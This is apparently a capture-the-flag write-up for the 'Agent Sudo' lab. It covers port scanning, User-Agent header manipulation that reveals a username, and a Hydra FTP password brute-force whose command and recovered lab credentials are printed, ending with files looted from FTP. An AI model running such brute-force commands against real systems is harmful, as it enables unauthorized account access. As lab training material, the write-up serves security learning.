# Agent Sudo — Writeup

## Reconnaissance

### Nmap Scan  
We started with an `nmap` scan and discovered the following open ports:

| Port | Service |
|-------|---------|
| 21    | FTP     |
| 22    | SSH     |
| 80    | HTTP    |

---

## Web Enumeration

- We explored the web server (port 80) and used **Burp Suite** to modify the `User-Agent` header.
- After trying different agents, **Agent C** revealed the username:  
  ```
  Agent C's name is: chris
  ```

---

## FTP Brute-force

- We performed an FTP brute-force attack using **Hydra**:
  ```bash
  hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.130.39
  ```
- Found credentials:
  ```
  chris:crystal
  ```

---

## FTP Loot

Logged into FTP and found:
```
To_agentJ.txt  
cute-alien.jpg  
cutie.png
```
We downloaded all the files for analysis.
